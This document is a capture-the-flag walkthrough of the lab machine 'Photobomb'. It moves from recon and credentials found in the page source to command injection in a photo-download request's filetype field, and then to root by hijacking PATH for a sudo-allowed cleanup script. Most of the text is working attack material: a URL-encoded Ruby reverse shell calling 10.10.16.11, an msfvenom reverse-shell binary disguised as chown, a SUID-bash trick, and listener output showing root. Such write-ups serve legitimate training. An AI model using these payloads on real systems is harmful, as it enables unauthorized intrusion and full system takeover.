![image](https://user-images.githubusercontent.com/105310322/195705375-63f90af6-b2f9-4c0c-bee0-408ea2dc6cbf.png)

### Tools: msfvenom

### Vulnerabilities: ,Sudo: Change Path Variable

Nmap gives shows a webpage and ssh is open.

```console
└─$ nmap -A -p- -T4 -Pn 10.129.44.124
Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-13 10:04 CDT
Nmap scan report for 10.129.44.124
Host is up (0.031s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e22473bbfbdf5cb520b66876748ab58d (RSA)
|   256 04e3ac6e184e1b7effac4fe39dd21bae (ECDSA)
|_  256 20e05d8cba71f08c3a1819f24011d29e (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://photobomb.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.92 seconds
```

Accessing the webpage and looking at the source code we can find a username and password. ```pH0t0:b0Mb!```

http://pH0t0:b0Mb!@photobomb.htb/printer


![image](https://user-images.githubusercontent.com/105310322/195695976-b76720b2-7e3e-4d69-ab9d-9a08f19ac0ca.png)

Next we come to a page with pictures and a download section.

![image](https://user-images.githubusercontent.com/105310322/195698235-51057170-a92d-4bf5-b0be-7c14975b6f8f.png)


Before we get the the actual attack vector I tried a couple of different things.

In burp if we intercept the download page and get rid of fields except for the picture and then send it. This will actually bring us to a page that gives lots of information about what the webapp is running.

![image](https://user-images.githubusercontent.com/105310322/195699039-242afef3-3cf7-4eab-a376-e9d8f59e9b44.png)


I started with trying to exploit Sinatra with a directory traversal but the page confirmed that their were protections in place against it.

![image](https://user-images.githubusercontent.com/105310322/195699527-fc9a80e0-0ad5-46d3-90f9-037f80d8b313.png)

Also by trying to access other directories it will bring us to this page that confirms it is running Sinatra.

http://photobomb.htb/printerfriendly

![image](https://user-images.githubusercontent.com/105310322/195699688-cec33e27-e9d5-42c7-9000-94a8cc72ee7f.png)

Now on to the actual Attack Vector!


In BurpSuite intercept the ```Download Photo To Print``` and send it to repeater.

In the file field we can implant a reverse shell.

I used ```ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("10.10.16.11",1234))'``` and URL encoded it.

After crafting your payload it should look something like below.

Set up your listener and send your payload.

```
POST /printer HTTP/1.1
Host: photobomb.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 316
Origin: http://photobomb.htb
Authorization: Basic cEgwdDA6YjBNYiE=
Connection: close
Referer: http://photobomb.htb/printer
Upgrade-Insecure-Requests: 1

photo=eleanor-brooke-w-TLY0Ym4rM-unsplash.jpg&filetype=jpg;%72%75%62%79%20%2d%72%73%6f%63%6b%65%74%20%2d%65%27%73%70%61%77%6e%28%22%73%68%22%2c%5b%3a%69%6e%2c%3a%6f%75%74%2c%3a%65%72%72%5d%3d%3e%54%43%50%53%6f%63%6b%65%74%2e%6e%65%77%28%22%31%30%2e%31%30%2e%31%36%2e%31%31%22%2c%35%35%35%35%29%29%27&dimensions=30x20
```

We get a shell as wizard!

```console
└─$ nc -lvnp 1234                    
listening on [any] 1234 ...
connect to [10.10.16.11] from (UNKNOWN) [10.129.44.124] 49918
id
uid=1000(wizard) gid=1000(wizard) groups=1000(wizard)
```

Running sudo -l reveals that we can run cleanup.sh, but we can also set the PATH variable.

```console
wizard@photobomb:/tmp$ sudo -l
sudo -l
Matching Defaults entries for wizard on photobomb:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh
```

Checking out cleanup.sh shows that it is running chown whenever cleanup.sh is ran.

Our plan of attack is to have cleanup.sh read our own file chown before anything else. 

```
wizard@photobomb:/tmp$ cat /opt/cleanup.sh
cat /opt/cleanup.sh
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
```


So we can either create a reverse shell with msfvenom or change the suid bit on /bin/bash. I will show both.


Create your reverse shell and be sure to name it chown and then transfer it to the victim computer.

Note: Be sure to chmod your chown before trying to exploit. ie ```chmod 777 chown```

```console
└─$ msfvenom -p linux/x64/shell_reverse_tcp lhost=10.10.16.11 lport=1235 -f elf -o chown
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
Saved as: chown
```

The following command places /tmp as the first place in the path. This is where our chown is located. Set up our listener and grab it!

```console
wizard@photobomb:/tmp$ sudo PATH=/tmp\:/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin /opt/cleanup.sh
```
Awesome we got a root with a reverse shell.

```console
└─$ nc -lvnp 1235
listening on [any] 1235 ...
connect to [10.10.16.11] from (UNKNOWN) [10.129.44.124] 51630
id
uid=0(root) gid=0(root) groups=0(root)
```

This payload is the same thing except my chown has my own script in it. I placed this chown in /dev/shm

```
#!/bin/bash
chmod u+s /bin/bash
```
Next I do the same thing but instead place /dev/shm in front of the others to be called first.

Note: not putting the full paths for the other directory calls can mess up other commands that need to be ran.


After running it we can check the permissions to verify our suid bit and then run ```bash -p``` to execute as root!

```console
wizard@photobomb:/tmp$ sudo PATH=/dev/shm\:/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin /opt/cleanup.sh
<n\:/usr/bin\:/sbin\:/bin\:/snap/bin /opt/cleanup.sh
wizard@photobomb:/tmp$ ls -la /bin/bash
ls -la /bin/bash
-rwsr-xr-x 1 root root 1183448 Apr 18 09:14 /bin/bash
wizard@photobomb:/tmp$ bash -p
bash -p
bash-5.0# id
id
uid=1000(wizard) gid=1000(wizard) euid=0(root) groups=1000(wizard)
bash-5.0# 
```

```console
bash-5.0# cat /home/wizard/user.txt
cat /home/wizard/user.txt
bc45****************************
bash-5.0# cat /root/root.txt
cat /root/root.txt
5ab2****************************
```

Congratulations everyone!
